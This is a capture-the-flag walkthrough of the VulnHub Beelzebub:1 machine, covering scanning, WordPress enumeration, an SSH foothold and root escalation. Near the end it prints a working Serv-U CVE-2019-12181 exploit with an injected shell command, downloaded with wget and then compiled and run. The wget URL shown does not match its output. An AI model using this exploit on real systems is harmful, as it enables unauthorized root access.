---
title: "VulnHub - Beelzebub:1 Vulnerable machine"
date: 2025-07-01 00:00:02 - 0500
categories: [  VulnHub , Lab , Vulnerability Assessment]
tags: [Footprinting, Easy]
image:
    path: /assets/img/1.gif
    alt: image
---

## Machine Details:

**About Release**

- **Name**: Beelzebub: 1
- **Date release**: 8 Sep 2021
- **Author**: [Shaurya Sharma](https://www.vulnhub.com/author/shaurya-sharma,818/)
- **Series**: [Beelzebub](https://www.vulnhub.com/entry/beelzebub-1,742/)

**Download**  
*Please remember that VulnHub is a free community resource so we are unable to check the machines that are provided to us. Before you download, please read our FAQs sections dealing with the dangers of running unknown VMs and our suggestions for “protecting yourself and your network. If you understand the risks, please download!*

- **Beelzebub.zip**
    
    (Size: 4.1 GB)
    
- **Download (Mirror)**: https://download.vulnhub.com/beelzebub/Beelzebub.zip

**Description**

Difficulty: Easy

You have to enumerate as much as you can and don't forget about the Base64.

---

### Introduction:

This machine test the knowledge on website information gathering. On finding directory search along with hidden flag, Identifying CMS systems, Users , Passwords and escalating from user access to root!

### Recon

To kick off I’d used the `rustscan` to identity the open ports initial scan revels only 2 ports, on which a site running on port 80, also with ssh port.

```bash
┌──(blackops㉿Blackops)-[~]
└─$ rustscan -a 192.168.1.21
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/blackops/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.1.21:22
Open 192.168.1.21:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-02 18:31 IST
Initiating ARP Ping Scan at 18:31
Scanning 192.168.1.21 [1 port]
Completed ARP Ping Scan at 18:31, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:31
Completed Parallel DNS resolution of 1 host. at 18:31, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 18:31
Scanning 192.168.1.21 [2 ports]
Discovered open port 22/tcp on 192.168.1.21
Discovered open port 80/tcp on 192.168.1.21
Completed SYN Stealth Scan at 18:31, 0.03s elapsed (2 total ports)
Nmap scan report for 192.168.1.21
Host is up, received arp-response (0.00051s latency).
Scanned at 2025-07-02 18:31:08 IST for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:44:A9:17 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)
```

Let’s do a directory search on the port, here i have used 2 types of tools for better visibility. There is hide was identified on the URL, `/index.php` this web-page is has the interface like it’s can’t connect to it, but the hidden under the web page source code. 

```bash
┌──(blackops㉿Blackops)-[~]
└─$ dirsearch -u http://192.168.1.21/ -e html,php,txt
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: html, php, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10403

Output File: /home/blackops/reports/http_192.168.1.21/__25-07-02_18-51-21.txt

Target: http://192.168.1.21/

[18:51:21] Starting: 
[18:51:22] 403 -  277B  - /.ht_wsr.txt
[18:51:22] 403 -  277B  - /.htaccess.bak1
[18:51:22] 403 -  277B  - /.htaccess.orig
[18:51:22] 403 -  277B  - /.htaccess.sample
[18:51:22] 403 -  277B  - /.htaccess_extra
[18:51:22] 403 -  277B  - /.htaccess.save
[18:51:22] 403 -  277B  - /.htaccess_sc
[18:51:22] 403 -  277B  - /.htaccessOLD2
[18:51:22] 403 -  277B  - /.htaccessOLD
[18:51:22] 403 -  277B  - /.htaccessBAK
[18:51:22] 403 -  277B  - /.htm
[18:51:22] 403 -  277B  - /.html
[18:51:22] 403 -  277B  - /.htpasswd_test
[18:51:22] 403 -  277B  - /.httr-oauth
[18:51:22] 403 -  277B  - /.htpasswds
[18:51:23] 403 -  277B  - /.php
[18:51:24] 403 -  277B  - /.htaccess_orig
[18:51:33] 200 -  221B  - /index.php
[18:51:33] 200 -  221B  - /index.php/login/
[18:51:34] 301 -  317B  - /javascript  ->  http://192.168.1.21/javascript/
[18:51:37] 200 -   24KB - /phpinfo.php
[18:51:37] 301 -  317B  - /phpmyadmin  ->  http://192.168.1.21/phpmyadmin/
[18:51:38] 200 -    3KB - /phpmyadmin/
[18:51:38] 200 -    3KB - /phpmyadmin/index.php
[18:51:38] 200 -    3KB - /phpmyadmin/doc/html/index.html
[18:51:40] 403 -  277B  - /server-status
[18:51:40] 403 -  277B  - /server-status/
```

```bash

<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<!--My heart was encrypted, "beelzebub" somehow hacked and decoded it.-md5-->
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.30 (Ubuntu)</address>
</body></html>
```

This is the hint the author left to us, To convert this I’ll use these commands, thus gives md5 hash of the word `beelzebub` , After looking around for long time, I’ve found that attaching this hash value to directory search result in finding more sites, 

```bash
┌──(blackops㉿Blackops)-[~]
└─$ echo -n "beelzebub" | md5sum
d18e1e22becbd915b45e0e655429d487
```

### Directory-Search

Here is what we found using the hint hash value along with Directory search, Looking at the website it’s easy to find the CMS (content management system) is WordPress!. Now that we found few more websites eventually you’ll end a looking at a website were you can interact with a interface, Looking under the hood of that particular web page, I was able to find a password send along with header of the response. I can be found using Burp/Caido to intercept the request the password, else check with In-build Browser fields to read the request and reposes.

```bash
┌──(blackops㉿Blackops)-[~]
└─$ dirsearch -u http://192.168.1.21/d18e1e22becbd915b45e0e655429d487/ -e html,php,t

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: html, php, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10403

Output File: /home/blackops/reports/http_192.168.1.21/_d18e1e22becbd915b45e0e655429d487__25-07-02_19-09-39.txt

Target: http://192.168.1.21/

[19:09:39] Starting: d18e1e22becbd915b45e0e655429d487/
[19:09:42] 403 -  277B  - /d18e1e22becbd915b45e0e655429d487/.ht_wsr.txt
[19:09:42] 403 -  277B  - /d18e1e22becbd915b45e0e655429d487/.htaccess.bak1
[19:09:42] 403 -  277B  - /d18e1e22becbd915b45e0e655429d487/.htaccess.orig
[19:09:42] 403 -  277B  - /d18e1e22becbd915b45e0e655429d487/.htaccess.sample
[19:09:42] 403 -  277B  - /d18e1e22becbd915b45e0e655429d487/.htaccess_extra
[19:09:42] 403 -  277B  - /d18e1e22becbd915b45e0e655429d487/.htaccess_orig
[19:09:42] 403 -  277B  - /d18e1e22becbd915b45e0e655429d487/.htaccess_sc
[19:09:42] 403 -  277B  - /d18e1e22becbd915b45e0e655429d487/.htaccessOLD
[19:09:42] 403 -  277B  - /d18e1e22becbd915b45e0e655429d487/.htaccessOLD2
[19:09:42] 403 -  277B  - /d18e1e22becbd915b45e0e655429d487/.htaccessBAK
[19:09:42] 403 -  277B  - /d18e1e22becbd915b45e0e655429d487/.htm
[19:09:42] 403 -  277B  - /d18e1e22becbd915b45e0e655429d487/.html
[19:09:42] 403 -  277B  - /d18e1e22becbd915b45e0e655429d487/.htpasswds
[19:09:42] 403 -  277B  - /d18e1e22becbd915b45e0e655429d487/.httr-oauth
[19:09:42] 403 -  277B  - /d18e1e22becbd915b45e0e655429d487/.htpasswd_test
[19:09:43] 403 -  277B  - /d18e1e22becbd915b45e0e655429d487/.php
[19:09:43] 403 -  277B  - /d18e1e22becbd915b45e0e655429d487/.htaccess.save
[19:10:01] 200 -   19KB - /d18e1e22becbd915b45e0e655429d487/index.php
[19:10:01] 404 -   55KB - /d18e1e22becbd915b45e0e655429d487/index.php/login/
[19:10:03] 200 -    7KB - /d18e1e22becbd915b45e0e655429d487/license.txt
[19:10:11] 200 -    3KB - /d18e1e22becbd915b45e0e655429d487/readme.html
[19:10:21] 301 -  348B  - /d18e1e22becbd915b45e0e655429d487/wp-admin  ->  http://192.168.1.21/d18e1e22becbd915b45e0e655429d487/wp-admin/
[19:10:21] 200 -    0B  - /d18e1e22becbd915b45e0e655429d487/wp-config.php
[19:10:21] 400 -    1B  - /d18e1e22becbd915b45e0e655429d487/wp-admin/admin-ajax.php
[19:10:21] 200 -  580B  - /d18e1e22becbd915b45e0e655429d487/wp-admin/install.php
[19:10:21] 302 -    0B  - /d18e1e22becbd915b45e0e655429d487/wp-admin/  ->  http://192.168.1.6/d18e1e22becbd915b45e0e655429d487/wp-login.php?redirect_to=http%3A%2F%2F192.168.1.21%2Fd18e1e22becbd915b45e0e655429d487%2Fwp-admin%2F&reauth=1
[19:10:21] 500 -    3KB - /d18e1e22becbd915b45e0e655429d487/wp-admin/setup-config.php
[19:10:21] 301 -  350B  - /d18e1e22becbd915b45e0e655429d487/wp-content  ->  http://192.168.1.21/d18e1e22becbd915b45e0e655429d487/wp-content/
[19:10:21] 200 -    0B  - /d18e1e22becbd915b45e0e655429d487/wp-content/
[19:10:21] 200 -   84B  - /d18e1e22becbd915b45e0e655429d487/wp-content/plugins/akismet/akismet.php
[19:10:21] 500 -    0B  - /d18e1e22becbd915b45e0e655429d487/wp-content/plugins/hello.php
[19:10:21] 200 -  444B  - /d18e1e22becbd915b45e0e655429d487/wp-content/upgrade/
[19:10:21] 200 -  516B  - /d18e1e22becbd915b45e0e655429d487/wp-content/uploads/
[19:10:22] 301 -  351B  - /d18e1e22becbd915b45e0e655429d487/wp-includes  ->  http://192.168.1.21/d18e1e22becbd915b45e0e655429d487/wp-includes/
[19:10:22] 500 -    0B  - /d18e1e22becbd915b45e0e655429d487/wp-includes/rss-functions.php
[19:10:22] 200 -    4KB - /d18e1e22becbd915b45e0e655429d487/wp-includes/
[19:10:22] 200 -    0B  - /d18e1e22becbd915b45e0e655429d487/wp-cron.php
[19:10:22] 200 -    2KB - /d18e1e22becbd915b45e0e655429d487/wp-login.php
[19:10:22] 302 -    0B  - /d18e1e22becbd915b45e0e655429d487/wp-signup.php  ->  http://192.168.1.6/d18e1e22becbd915b45e0e655429d487/wp-login.php?action=register
[19:10:22] 405 -   42B  - /d18e1e22becbd915b45e0e655429d487/xmlrpc.php

Task Completed

### The link http://192.168.1.21/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/Talk%20To%20VALAK/index.php ##
```

### Username Enumeration

But I have to identify the User for this password to work, where is where the CMS system helps, as we already identified the type of CMS system. With quick google search we’ll be able to find a tool called `wpscan.`  Using that we’ll scan the target for potential usernames.

```bash
┌──(blackops㉿Blackops)-[~]
└─$ wpscan --url http://192.168.1.21/d18e1e22becbd915b45e0e655429d487/ -e u --ignore-main-redirect --force
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.1.21/d18e1e22becbd915b45e0e655429d487/ [192.168.1.21]
[+] Started: Wed Jul  2 19:38:31 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.29 (Ubuntu)
 |  - X-Redirect-By: WordPress
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.1.21/d18e1e22becbd915b45e0e655429d487/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.1.21/d18e1e22becbd915b45e0e655429d487/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.1.21/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.1.21/d18e1e22becbd915b45e0e655429d487/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3.6 identified (Insecure, released on 2020-10-30).
 | Found By: Atom Generator (Aggressive Detection)
 |  - http://192.168.1.21/d18e1e22becbd915b45e0e655429d487/index.php/feed/atom/, <generator uri="https://wordpress.org/" version="5.3.6">WordPress</generator>
 | Confirmed By: Style Etag (Aggressive Detection)
 |  - http://192.168.1.21/d18e1e22becbd915b45e0e655429d487/wp-admin/load-styles.php, Match: '5.3.6'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:03 <=======================================> (10 / 10) 100.00% Time: 00:00:03

[i] User(s) Identified:

[+] valak
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] krampus
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

### Foothold

Now that I’ve found usernames checking with `SSH` , I was able to login into `krampus` with the password I found on browser request `M4k3Ad3a1` Now that we logged-in, I was able to get the userflag.txt and also able to login on to GUI version. 

```bash
┌──(blackops㉿Blackops)-[~]
└─$ ssh krampus@192.168.1.21
krampus@192.168.1.21's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

450 packages can be updated.
387 updates are security updates.

New release '20.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Wed Jul  2 19:49:21 2025 from 192.168.1.19
krampus@beelzebub:~$ cat Desktop/user.txt 
aq12uu909a0q921a2819b05568a992m9

```

### Privilege Escalation

Checking with the user ./bach_history something happned in the history which is worth taking a look, looks like a exploit was downloaded checking with online with it’s code reveals it’s was a CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation - A privilege escalation vulnerability exists in SolarWinds Serv-U before 15.1.7 for Linux.

```bash
## history we found on ./bash_history
wget https://www.exploit-db.com/download/47009
clear
ls
clear
mv 47009 ./exploit.c
gcc exploit.c -o exploit
./exploit 
```

Lets download that file run it for privilege escalation and it’s works as expected we gained Root access!

```bash
krampus@beelzebub:~$ wget https://asdfasdf.exploit-db.com/download/47009 -O file.c
--2025-07-02 19:52:22--  https://www.exploit-db.com/download/47009
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 619 [application/txt]
Saving to: ‘file.c’

file.c                        100%[==============================================>]     619  --.-KB/s    in 0s      

2025-07-02 19:52:23 (68.1 MB/s) - ‘file.c’ saved [619/619]

krampus@beelzebub:~$ cat file.c
/*

CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation 

vulnerability found by:
Guy Levin (@va_start - twitter.com/va_start) https://blog.vastart.dev

to compile and run:
gcc servu-pe-cve-2019-12181.c -o pe && ./pe

*/

#include <stdio.h>
#include <unistd.h>
#include <errno.h>

int main()
{       
    char *vuln_args[] = {"\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", NULL};
    int ret_val = execv("/usr/local/Serv-U/Serv-U", vuln_args);
    // if execv is successful, we won't reach here
    printf("ret val: %d errno: %d\n", ret_val, errno);
    return errno;
}krampus@beelzebub:~$ mv file.c servu-pe-cve-2019-12181.c
krampus@beelzebub:~$ gcc servu-pe-cve-2019-12181.c -o pe && ./pe
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(krampus)
opening root shell
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(krampus)
# cd /
# cd root
# dir
root.txt
# cat root.txt
8955qpasq8qq807879p75e1rr24cr1a5

```

With that this gets rooted! `the queter you become the more you can hear`